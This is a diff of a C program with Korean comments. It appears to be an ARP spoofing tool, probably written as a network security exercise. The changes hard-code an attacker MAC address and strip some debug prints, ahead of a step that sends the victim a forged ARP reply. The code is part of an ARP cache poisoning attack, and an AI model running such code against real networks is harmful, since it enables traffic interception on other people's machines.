@@ -72,11 +72,17 @@ int main(int argc, char* argv[])
         return -1;
     }
 
-    printf("%02x:%02x:%02x:%02x:%02x:%02x\n", attacker_mac_address[0], attacker_mac_address[1], attacker_mac_address[2], attacker_mac_address[3], attacker_mac_address[4], attacker_mac_address[5]);
-
     // 첫 번째로 할 일 - sender 의 mac address 를 알아야 함
 
         // arp request 전송
+    
+    attacker_mac_address[0] = 0x38;
+    attacker_mac_address[1] = 0xf9;
+    attacker_mac_address[2] = 0xd3;
+    attacker_mac_address[3] = 0x73;
+    attacker_mac_address[4] = 0xa4;
+    attacker_mac_address[5] = 0x24;
+
     arp_packet arp_packet_get_sender_mac_packet;
     arp_packet_get_sender_mac_packet = arp_request_get_sender_mac_addr(attacker_mac_address, sender_ip);
     
@@ -85,7 +91,6 @@ int main(int argc, char* argv[])
         printf("[Error] packet sending is failed.\n");
         return -1;
     }
-    sleep(1);
 
         // arp response 수신
     uint8_t sender_mac[6];
@@ -117,7 +122,6 @@ int main(int argc, char* argv[])
             }
         }
     }
-    printf("%02x:%02x:%02x:%02x:%02x:%02x\n", sender_mac[0], sender_mac[1], sender_mac[2], sender_mac[3], sender_mac[4], sender_mac[5]);
 
     // 두 번째로 할 일 - sender 에게 [ip = target ip / mac = attacker mac] 인 arp response 전송
     arp_packet arp_packet_deceive_sender;
